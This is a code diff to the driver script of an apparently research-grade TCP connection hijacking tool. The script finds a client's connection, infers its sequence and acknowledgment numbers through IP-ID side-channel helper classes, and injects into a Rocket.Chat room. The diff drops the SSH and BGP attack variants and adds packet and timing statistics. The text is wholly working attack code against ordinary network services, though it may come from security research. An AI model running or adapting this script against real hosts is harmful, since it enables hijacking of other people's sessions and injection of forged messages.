@@ -6,14 +6,11 @@ from IPID_HCSC.connetcion_find import Connection_Finder
 from IPID_HCSC.seq_find import Seq_Finder
 from IPID_HCSC.ack_find import *
 
-P_SSH = 22
-P_BGP = 179
-P_ROCKET_CHAT = 3000
 
 if __name__ == '__main__':
     server_mac = '00:0c:29:20:f4:8c'
     server_ip = '10.10.100.2'
-    server_port = P_ROCKET_CHAT
+    server_port = 3000
 
     client_ip = '10.10.100.1'
 
@@ -26,6 +23,7 @@ if __name__ == '__main__':
                                    verbose=True)
     connection.run()
     client_port = connection.result
+
     if client_port == -1:
         print('No Connection Found.')
         exit(1)
@@ -43,22 +41,14 @@ if __name__ == '__main__':
         ack = Ack_Finder(forge_ip=collision_ip, client_ip=client_ip, server_ip=server_ip,
                          server_port=server_port, client_port=client_port, seq_in_win=seq_in_win,
                          server_mac=server_mac, bind_if_name=attack_bind_if)
-        # for ssh
-        # ack.run_attack_ssh()
-        # seq_exact = ack.seq_num
-        # attack_action_ssh(client_ip=client_ip, server_ip=server_ip, client_port=client_port,
-        #                   server_port=server_port, seq=seq_exact, ifname=attack_bind_if)
 
-        # for BGP
-        # ack.run_attack_bgp()
-        # seq = ack.seq_num
-        # ack = ack.ack_in_win
-        # attack_action_bgp(client_ip=client_ip, server_ip=server_ip, client_port=client_port,
-        #                   server_port=server_port, seq=seq, ack=ack)
-
-        # for Rochet.Chat
         ack.run_attack_rocket_chat()
-        seq = ack.seq_num
-        ack = ack.ack_in_win
+        seq_num = ack.seq_num
+        ack_num = ack.ack_in_win
         attack_action_rocketchat(client_ip=client_ip, server_ip=server_ip, client_port=client_port,
-                                 server_port=server_port, seq=seq, ack=ack, room_id='zqYBGxeXzeLYdHf8L')
+                                 server_port=server_port, seq=seq_num, ack=ack_num, room_id='zqYBGxeXzeLYdHf8L')
+
+        print('------ Total Statistics ------')
+        print('Time: ' + str(connection.cost_time + seq.cost_time + ack.cost_time) + ' (s)')
+        print('Packets: ' + str(connection.send_n + seq.send_n + ack.send_n))
+        print('Bytes: ' + str(connection.send_byte + seq.send_byte + ack.send_byte) + ' (bytes)')
